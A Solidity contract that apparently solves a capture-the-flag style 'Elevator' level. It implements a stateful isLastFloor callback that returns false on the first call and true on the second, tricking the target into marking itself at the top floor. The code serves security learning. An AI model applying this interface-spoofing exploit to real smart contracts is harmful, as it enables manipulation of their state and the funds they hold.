// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract AttackElevator {
    Elevator private immutable target;
    bool public counter; // Defaults to false

    constructor(address _target) {
        target = Elevator(_target);
    }

    function hack() external {
        target.goTo(1);
        require(target.top(), "Not the top floor");
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!counter) {
            counter = true;
            return false;
        } else {
            counter = false;
            return true;
        }
    }
}
